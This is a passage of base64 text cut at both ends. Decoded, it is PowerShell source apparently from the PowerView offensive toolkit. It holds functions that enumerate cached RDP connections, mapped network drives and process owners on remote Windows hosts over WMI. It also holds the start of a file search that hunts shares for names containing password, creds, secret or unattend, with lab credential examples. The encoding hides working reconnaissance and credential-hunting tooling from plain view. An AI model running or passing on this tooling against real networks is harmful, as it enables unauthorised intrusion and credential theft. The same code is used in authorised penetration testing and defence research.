5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyU0lEJyAkVXNlclNJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUYXJnZXRTZXJ2ZXInICRTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlcm5hbWVIaW50JyAkVXNlcm5hbWVIaW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5DYWNoZWRSRFBDb25uZWN0aW9uJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbl0gRXJyb3I6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LVdNSVJlZ0NhY2hlZFJEUENvbm5lY3Rpb25dIEVycm9yIGFjY2Vzc2luZyAkQ29tcHV0ZXIsIGxpa2VseSBpbnN1ZmZpY2llbnQgcGVybWlzc2lvbnMgb3IgZmlyZXdhbGwgcnVsZXMgb24gaG9zdDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtV01JUmVnTW91bnRlZERyaXZlIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIGluZm9ybWF0aW9uIGFib3V0IHNhdmVkIG5ldHdvcmsgbW91bnRlZCBkcml2ZXMgZm9yIHRoZSBsb2NhbCAob3IgcmVtb3RlKSBtYWNoaW5lLgoKTm90ZTogVGhpcyBmdW5jdGlvbiByZXF1aXJlcyBhZG1pbmlzdHJhdGl2ZSByaWdodHMgb24gdGhlIG1hY2hpbmUgeW91J3JlIGVudW1lcmF0aW5nLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBDb252ZXJ0RnJvbS1TSUQgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIHJlbW90ZSByZWdpc3RyeSBmdW5jdGlvbmFsaXR5IHRvIGVudW1lcmF0ZSByZWNlbnRseSBtb3VudGVkIG5ldHdvcmsgZHJpdmVzLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIG1vdW50ZWQgZHJpdmUgaW5mb3JtYXRpb24gKGFsc28gYWNjZXB0cyBJUCBhZGRyZXNzZXMpLgpEZWZhdWx0cyB0byAnbG9jYWxob3N0Jy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGluZyB0byB0aGUgcmVtb3RlIHN5c3RlbS4KCi5FWEFNUExFCgpHZXQtV01JUmVnTW91bnRlZERyaXZlCgpSZXR1cm5zIHRoZSBzYXZlZCBuZXR3b3JrIG1vdW50ZWQgZHJpdmVzIGZvciB0aGUgbG9jYWwgbWFjaGluZS4KCi5FWEFNUExFCgpHZXQtV01JUmVnTW91bnRlZERyaXZlIC1Db21wdXRlck5hbWUgV0lORE9XUzIudGVzdGxhYi5sb2NhbAoKUmV0dXJucyB0aGUgc2F2ZWQgbmV0d29yayBtb3VudGVkIGRyaXZlcyBmb3IgdGhlIFdJTkRPV1MyLnRlc3RsYWIubG9jYWwgbWFjaGluZQoKLkVYQU1QTEUKCkdldC1Eb21haW5Db21wdXRlciB8IEdldC1XTUlSZWdNb3VudGVkRHJpdmUKClJldHVybnMgdGhlIHNhdmVkIG5ldHdvcmsgbW91bnRlZCBkcml2ZXMgZm9yIGFsbCBtYWNoaW5lcyBpbiB0aGUgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1XTUlSZWdNb3VudGVkRHJpdmUgLUNvbXB1dGVyTmFtZSBQUklNQVJZLnRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuUmVnTW91bnRlZERyaXZlCgpBIFBTQ3VzdG9tT2JqZWN0IGNvbnRhaW5pbmcgdGhlIENvbXB1dGVyTmFtZSBhbmQgbW91bnRlZCBkcml2ZSBpbmZvcm1hdGlvbi4KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlJlZ01vdW50ZWREcml2ZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgIyBIS0VZX1VTRVJTCiAgICAgICAgICAgICRIS1UgPSAyMTQ3NDgzNjUxCgogICAgICAgICAgICAkV21pQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdMaXN0JyA9ICRUcnVlCiAgICAgICAgICAgICAgICAnQ2xhc3MnID0gJ1N0ZFJlZ1Byb3YnCiAgICAgICAgICAgICAgICAnTmFtZXNwYWNlJyA9ICdyb290XGRlZmF1bHQnCiAgICAgICAgICAgICAgICAnQ29tcHV0ZXJuYW1lJyA9ICRDb21wdXRlcgogICAgICAgICAgICAgICAgJ0Vycm9yQWN0aW9uJyA9ICdTdG9wJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkV21pQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwoKICAgICAgICAgICAgICAgICMgZXh0cmFjdCBvdXQgdGhlIFNJRHMgb2YgZG9tYWluIHVzZXJzIGluIHRoaXMgaGl2ZQogICAgICAgICAgICAgICAgJFVzZXJTSURzID0gKCRSZWcuRW51bUtleSgkSEtVLCAnJykpLnNOYW1lcyB8IFdoZXJlLU9iamVjdCB7ICRfIC1tYXRjaCAnUy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJCcgfQoKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRVc2VyU0lEIGluICRVc2VyU0lEcykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTaWQgJFVzZXJTSUQgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9IENvbnZlcnRGcm9tLVNJRCAtT2JqZWN0U2lkICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICREcml2ZUxldHRlcnMgPSAoJFJlZy5FbnVtS2V5KCRIS1UsICIkVXNlclNJRFxOZXR3b3JrIikpLnNOYW1lcwoKICAgICAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJERyaXZlTGV0dGVyIGluICREcml2ZUxldHRlcnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcm92aWRlck5hbWUgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxOZXR3b3JrXCREcml2ZUxldHRlciIsICdQcm92aWRlck5hbWUnKS5zVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZW1vdGVQYXRoID0gJFJlZy5HZXRTdHJpbmdWYWx1ZSgkSEtVLCAiJFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXIiLCAnUmVtb3RlUGF0aCcpLnNWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJERyaXZlVXNlck5hbWUgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxOZXR3b3JrXCREcml2ZUxldHRlciIsICdVc2VyTmFtZScpLnNWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJFVzZXJOYW1lKSB7ICRVc2VyTmFtZSA9ICcnIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFJlbW90ZVBhdGggLWFuZCAoJFJlbW90ZVBhdGggLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlclNJRCcgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RyaXZlTGV0dGVyJyAkRHJpdmVMZXR0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb3ZpZGVyTmFtZScgJFByb3ZpZGVyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVtb3RlUGF0aCcgJFJlbW90ZVBhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RyaXZlVXNlck5hbWUnICREcml2ZVVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUmVnTW91bnRlZERyaXZlJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVdNSVJlZ01vdW50ZWREcml2ZV0gRXJyb3I6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LVdNSVJlZ01vdW50ZWREcml2ZV0gRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlciwgbGlrZWx5IGluc3VmZmljaWVudCBwZXJtaXNzaW9ucyBvciBmaXJld2FsbCBydWxlcyBvbiBob3N0OiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1XTUlQcm9jZXNzIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIGEgbGlzdCBvZiBwcm9jZXNzZXMgYW5kIHRoZWlyIG93bmVycyBvbiB0aGUgbG9jYWwgb3IgcmVtb3RlIG1hY2hpbmUuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIEdldC1XTUlPYmplY3QgdG8gZW51bWVyYXRlIGFsbCBXaW4zMl9wcm9jZXNzIGluc3RhbmNlcyBvbiB0aGUgbG9jYWwgb3IgcmVtb3RlIG1hY2hpbmUsCmluY2x1ZGluZyB0aGUgb3duZXJzIG9mIHRoZSBwYXJ0aWN1bGFyIHByb2Nlc3MuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3IgY2FjaGVkIFJEUCBjb25uZWN0aW9ucyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvICdsb2NhbGhvc3QnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSByZW1vdGUgc3lzdGVtLgoKLkVYQU1QTEUKCkdldC1XTUlQcm9jZXNzIC1Db21wdXRlck5hbWUgV0lORE9XUzEKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtV01JUHJvY2VzcyAtQ29tcHV0ZXJOYW1lIFBSSU1BUlkudGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5Vc2VyUHJvY2VzcwoKQSBQU0N1c3RvbU9iamVjdCBjb250YWluaW5nIHRoZSByZW1vdGUgcHJvY2VzcyBpbmZvcm1hdGlvbi4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Vc2VyUHJvY2VzcycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRXbWlBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgICAgICdDb21wdXRlck5hbWUnID0gJENvbXB1dGVyTmFtZQogICAgICAgICAgICAgICAgICAgICdDbGFzcycgPSAnV2luMzJfcHJvY2VzcycKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkV21pQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgICAgICAgICBHZXQtV01Jb2JqZWN0IEBXbWlBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJE93bmVyID0gJF8uZ2V0b3duZXIoKTsKICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb2Nlc3NOYW1lJyAkXy5Qcm9jZXNzTmFtZQogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb2Nlc3NJRCcgJF8uUHJvY2Vzc0lECiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRG9tYWluJyAkT3duZXIuRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlcicgJE93bmVyLlVzZXIKICAgICAgICAgICAgICAgICAgICAkUHJvY2Vzcy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuVXNlclByb2Nlc3MnKQogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1XTUlQcm9jZXNzXSBFcnJvciBlbnVtZXJhdGluZyByZW1vdGUgcHJvY2Vzc2VzIG9uICckQ29tcHV0ZXInLCBhY2Nlc3MgbGlrZWx5IGRlbmllZDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBGaW5kLUludGVyZXN0aW5nRmlsZSB7CjwjCi5TWU5PUFNJUwoKU2VhcmNoZXMgZm9yIGZpbGVzIG9uIHRoZSBnaXZlbiBwYXRoIHRoYXQgbWF0Y2ggYSBzZXJpZXMgb2Ygc3BlY2lmaWVkIGNyaXRlcmlhLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBBZGQtUmVtb3RlQ29ubmVjdGlvbiwgUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24gIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHJlY3Vyc2l2ZWx5IHNlYXJjaGVzIGEgZ2l2ZW4gVU5DIHBhdGggZm9yIGZpbGVzIHdpdGgKc3BlY2lmaWMga2V5d29yZHMgaW4gdGhlIG5hbWUgKGRlZmF1bHQgb2YgcGFzcywgc2Vuc2l0aXZlLCBzZWNyZXQsIGFkbWluLApsb2dpbiBhbmQgdW5hdHRlbmQqLnhtbCkuIEJ5IGRlZmF1bHQsIGhpZGRlbiBmaWxlcy9mb2xkZXJzIGFyZSBpbmNsdWRlZAppbiBzZWFyY2ggcmVzdWx0cy4gSWYgLUNyZWRlbnRpYWwgaXMgcGFzc2VkLCBBZGQtUmVtb3RlQ29ubmVjdGlvbi9SZW1vdmUtUmVtb3RlQ29ubmVjdGlvbgppcyB1c2VkIHRvIHRlbXBvcmFyaWx5IG1hcCB0aGUgcmVtb3RlIHNoYXJlLgoKLlBBUkFNRVRFUiBQYXRoCgpVTkMvbG9jYWwgcGF0aCB0byByZWN1cnNpdmVseSBzZWFyY2guCgouUEFSQU1FVEVSIEluY2x1ZGUKCk9ubHkgcmV0dXJuIGZpbGVzL2ZvbGRlcnMgdGhhdCBtYXRjaCB0aGUgc3BlY2lmaWVkIGFycmF5IG9mIHN0cmluZ3MsCmkuZS4gQCgqLmRvYyosICoueGxzKiwgKi5wcHQqKQoKLlBBUkFNRVRFUiBMYXN0QWNjZXNzVGltZQoKT25seSByZXR1cm4gZmlsZXMgd2l0aCBhIExhc3RBY2Nlc3NUaW1lIGdyZWF0ZXIgdGhhbiB0aGlzIGRhdGUgdmFsdWUuCgouUEFSQU1FVEVSIExhc3RXcml0ZVRpbWUKCk9ubHkgcmV0dXJuIGZpbGVzIHdpdGggYSBMYXN0V3JpdGVUaW1lIGdyZWF0ZXIgdGhhbiB0aGlzIGRhdGUgdmFsdWUuCgouUEFSQU1FVEVSIENyZWF0aW9uVGltZQoKT25seSByZXR1cm4gZmlsZXMgd2l0aCBhIENyZWF0aW9uVGltZSBncmVhdGVyIHRoYW4gdGhpcyBkYXRlIHZhbHVlLgoKLlBBUkFNRVRFUiBPZmZpY2VEb2NzCgpTd2l0Y2guIFNlYXJjaCBmb3Igb2ZmaWNlIGRvY3VtZW50cyAoKi5kb2MqLCAqLnhscyosICoucHB0KikKCi5QQVJBTUVURVIgRnJlc2hFWEVzCgpTd2l0Y2guIEZpbmQgLkVYRXMgYWNjZXNzZWQgd2l0aGluIHRoZSBsYXN0IDcgZGF5cy4KCi5QQVJBTUVURVIgRXhjbHVkZUZvbGRlcnMKClN3aXRjaC4gRXhjbHVkZSBmb2xkZXJzIGZyb20gdGhlIHNlYXJjaCByZXN1bHRzLgoKLlBBUkFNRVRFUiBFeGNsdWRlSGlkZGVuCgpTd2l0Y2guIEV4Y2x1ZGUgaGlkZGVuIGZpbGVzIGFuZCBmb2xkZXJzIGZyb20gdGhlIHNlYXJjaCByZXN1bHRzLgoKLlBBUkFNRVRFUiBDaGVja1dyaXRlQWNjZXNzCgpTd2l0Y2guIE9ubHkgcmV0dXJucyBmaWxlcyB0aGUgY3VycmVudCB1c2VyIGhhcyB3cml0ZSBhY2Nlc3MgdG8uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKdG8gY29ubmVjdCB0byByZW1vdGUgc3lzdGVtcyBmb3IgZmlsZSBlbnVtZXJhdGlvbi4KCi5FWEFNUExFCgpGaW5kLUludGVyZXN0aW5nRmlsZSAtUGF0aCAiQzpcQmFja3VwXCIKClJldHVybnMgYW55IGZpbGVzIG9uIHRoZSBsb2NhbCBwYXRoIEM6XEJhY2t1cFwgdGhhdCBoYXZlIHRoZSBkZWZhdWx0CnNlYXJjaCB0ZXJtIHNldCBpbiB0aGUgdGl0bGUuCgouRVhBTVBMRQoKRmluZC1JbnRlcmVzdGluZ0ZpbGUgLVBhdGggIlxcV0lORE9XUzdcVXNlcnNcIiAtTGFzdEFjY2Vzc1RpbWUgKEdldC1EYXRlKS5BZGREYXlzKC03KQoKUmV0dXJucyBhbnkgZmlsZXMgb24gdGhlIHJlbW90ZSBwYXRoIFxcV0lORE9XUzdcVXNlcnNcIHRoYXQgaGF2ZSB0aGUgZGVmYXVsdApzZWFyY2ggdGVybSBzZXQgaW4gdGhlIHRpdGxlIGFuZCB3ZXJlIGFjY2Vzc2VkIHdpdGhpbiB0aGUgbGFzdCB3ZWVrLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkZpbmQtSW50ZXJlc3RpbmdGaWxlIC1DcmVkZW50aWFsICRDcmVkIC1QYXRoICJcXFBSSU1BUlkudGVzdGxhYi5sb2NhbFxDJFxUZW1wXCIKCi5PVVRQVVRTCgpQb3dlclZpZXcuRm91bmRGaWxlCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRm91bmRGaWxlJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFBhdGggPSAnLlwnLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VhcmNoVGVybXMnLCAnVGVybXMnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJEluY2x1ZGUgPSBAKCcqcGFzc3dvcmQqJywgJypzZW5zaXRpdmUqJywgJyphZG1pbionLCAnKmxvZ2luKicsICcqc2VjcmV0KicsICd1bmF0dGVuZCoueG1sJywgJyoudm1kaycsICcqY3JlZHMqJywgJypjcmVkZW50aWFsKicsICcqLmNvbmZpZycpLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkTGFzdEFjY2Vzc1RpbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdG